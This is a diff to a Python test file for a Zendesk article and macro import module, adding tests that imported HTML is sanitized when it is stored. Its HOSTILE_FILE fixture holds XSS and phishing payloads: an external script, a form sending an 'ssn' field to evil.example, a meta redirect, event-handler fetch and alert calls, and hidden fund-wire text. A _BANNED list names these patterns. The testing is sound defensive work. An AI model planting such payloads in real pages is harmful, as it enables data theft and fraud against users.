@@ -8,6 +8,13 @@ differing pulled baseline), per-file error isolation, and pull_mirror's
 GET-only network contract including the new sections/categories client
 endpoints and their paged variants. The parser must NEVER raise: every
 failure is a per-file error string in the report.
+
+Also locked: the STORE-BOUNDARY SANITIZE. Everything this module writes
+goes in through upserts with origin='import', which sanitize body_html and
+HTML-bearing macro action values at the write — a file is untrusted input
+and mirror bytes are copy-exact material. ``origin='pull'`` is the one
+documented exception (byte-faithful mirror), handled honestly downstream
+by src/services/zendesk_web.py rather than by silent rewriting.
 """
 
 import hashlib
@@ -18,6 +25,7 @@ import urllib.error
 import pytest
 
 from src.data import zendesk_import, zendesk_store
+from src.data.html_sanitize import sanitize_html
 
 
 # ── shared helpers ───────────────────────────────────────────────────
@@ -251,7 +259,7 @@ class TestJsonImport:
 # ── parser table: HTML + doc_reader files ────────────────────────────
 
 class TestFileImport:
-    def test_html_title_tag_and_verbatim_body(self, empty_db, tmp_path):
+    def test_html_title_tag_and_sanitized_body(self, empty_db, tmp_path):
         conn = empty_db.conn
         raw = ("<html><head><title>SSO &amp; SAML</title></head>"
                "<body><h1>Other</h1><p>b</p></body></html>")
@@ -262,8 +270,13 @@ class TestFileImport:
                            "FROM zendesk_articles").fetchone()
         assert row[0] == _expected_synthetic(os.path.abspath(path))
         assert row[0] < 0
-        assert row[1] == "SSO & SAML"       # entity-decoded <title> wins
-        assert row[2] == raw                # body_html VERBATIM
+        # the title is read from the RAW text (<head>/<title> do not survive
+        # the store-boundary sanitize) and stays entity-decoded
+        assert row[1] == "SSO & SAML"
+        # body_html is the SANITIZED file text (see the module note): the
+        # renderable allowlist subset, not the raw bytes
+        assert row[2] == sanitize_html(raw)
+        assert row[2] == "<h1>Other</h1><p>b</p>"
         assert row[3] == os.path.abspath(path)
 
     def test_html_h1_fallback_then_filename(self, empty_db, tmp_path):
@@ -423,6 +436,118 @@ class TestHostileInputs:
         path = _write(tmp_path, "fake.docx", b"not a zip at all")
         rep = zendesk_import.import_file(empty_db.conn, path)
         assert rep["imported"] == 0 and rep["errors"]
+
+
+# ── store-boundary sanitize (VARIANT 3's root cause) ─────────────────
+
+HOSTILE_FILE = (
+    "<html><head><title>Payer update</title>"
+    '<meta http-equiv="refresh" content="0;url=https://evil.example">'
+    "<style>body{background:url(https://evil.example/b)}</style></head>"
+    "<body><h1>Payer update</h1><p>Real content.</p>"
+    '<script src="https://evil.example/x.js"></script>'
+    '<form action="https://evil.example/collect"><input name="ssn"></form>'
+    '<object data="https://evil.example/o"></object>'
+    '<p onclick="fetch(\'https://evil.example\')">Click</p>'
+    '<img src="x" onerror="alert(1)">'
+    '<a href="javascript:alert(1)">go</a>'
+    '<span style="font-size: 0">Wire the funds first.</span>'
+    "</body></html>")
+
+_BANNED = ("<script", "<form", "<input", "<object", "<meta", "<style",
+           "onclick", "onerror", "javascript:", "evil.example")
+
+
+class TestStoreBoundarySanitize:
+    """An imported file is attacker-influenced input, and mirror bytes are
+    copy-exact material a specialist pastes into live Zendesk by hand. The
+    import used to store the file text RAW while the ONLY on-screen view
+    (the preview iframe) was sanitized — so script/form/meta markup was
+    invisible to the reviewer and still reached the clipboard. Sanitize now
+    runs AT THE WRITE for every non-pull origin, so stored bytes ==
+    renderable bytes and there is nothing left to hide."""
+
+    def _stored(self, conn, article_id):
+        return conn.execute(
+            "SELECT body_html FROM zendesk_articles WHERE article_id=?",
+            (article_id,)).fetchone()[0]
+
+    def test_html_file_import_stores_no_hostile_markup(self, empty_db,
+                                                       tmp_path):
+        conn = empty_db.conn
+        path = _write(tmp_path, "payer.html", HOSTILE_FILE)
+        rep = zendesk_import.import_file(conn, path)
+        assert rep["imported"] == 1 and not rep["errors"]
+        stored = self._stored(conn, _expected_synthetic(os.path.abspath(path)))
+        low = stored.lower()
+        for banned in _BANNED:
+            assert banned not in low, banned
+        assert "Real content." in stored
+        assert stored == sanitize_html(stored)          # fixed point
+
+    def test_json_import_stores_no_hostile_markup(self, empty_db, tmp_path):
+        conn = empty_db.conn
+        path = _write(tmp_path, "export.json", json.dumps(
+            {"articles": [{"id": 77, "title": "T", "body_html": HOSTILE_FILE}]}))
+        assert zendesk_import.import_file(conn, path)["imported"] == 1
+        low = self._stored(conn, 77).lower()
+        for banned in _BANNED:
+            assert banned not in low, banned
+
+    def test_markdown_document_import_stores_no_hostile_markup(self, empty_db,
+                                                               tmp_path):
+        # markdown_to_html forwards raw HTML blocks, so a .md file is just
+        # as good a carrier as a .html one
+        conn = empty_db.conn
+        path = _write(tmp_path, "guide.md",
+                      "# Guide\n\nReal content.\n\n" + HOSTILE_FILE + "\n")
+        assert zendesk_import.import_file(conn, path)["imported"] == 1
+        low = self._stored(
+            conn, _expected_synthetic(os.path.abspath(path))).lower()
+        for banned in _BANNED:
+            assert banned not in low, banned
+
+    def test_imported_macro_reply_html_is_sanitized(self, empty_db, tmp_path):
+        conn = empty_db.conn
+        path = _write(tmp_path, "macros.json", json.dumps({"macros": [
+            {"id": 900, "title": "Reply",
+             "actions": [{"field": "comment_value_html",
+                          "value": '<p>Hi</p><script>x()</script>'},
+                         {"field": "set_tags", "value": "vip < 3"}]}]}))
+        assert zendesk_import.import_file(conn, path)["imported"] == 1
+        actions = zendesk_store.get_macro(conn, 900)["actions"]
+        assert "<script" not in actions[0]["value"].lower()
+        assert "<p>Hi</p>" in actions[0]["value"]
+        # a plain-text action value is NOT html and must not be mangled
+        assert actions[1] == {"field": "set_tags", "value": "vip < 3"}
+
+    def test_reimport_is_idempotent_after_sanitize(self, empty_db, tmp_path):
+        """The content hash is computed over the SANITIZED form, so the
+        same file re-imports as 'unchanged' instead of thrashing the row."""
+        conn = empty_db.conn
+        path = _write(tmp_path, "payer.html", HOSTILE_FILE)
+        assert zendesk_import.import_file(conn, path)["imported"] == 1
+        rep = zendesk_import.import_file(conn, path)
+        assert rep["skipped_unchanged"] == 1
+        assert rep["imported"] == 0 and rep["updated"] == 0
+
+    def test_pull_origin_bytes_stay_verbatim(self, empty_db):
+        """The ONE documented exception: the mirror is byte-faithful to
+        remote Zendesk. Pulled bytes are NOT rewritten — they are made
+        honest at review/copy time instead (zendesk_web's body_source +
+        markup notice + reviewed-bytes clipboard gate)."""
+        conn = empty_db.conn
+        zendesk_store.upsert_articles(
+            conn, [{"id": 88, "title": "T", "body_html": HOSTILE_FILE}],
+            origin="pull")
+        assert self._stored(conn, 88) == HOSTILE_FILE
+        zendesk_store.upsert_macros(
+            conn, [{"id": 88, "title": "M",
+                    "actions": [{"field": "comment_value_html",
+                                 "value": "<script>x()</script>"}]}],
+            origin="pull")
+        assert (zendesk_store.get_macro(conn, 88)["actions"][0]["value"]
+                == "<script>x()</script>")
 
 
 # ── pull-origin collision policy ─────────────────────────────────────
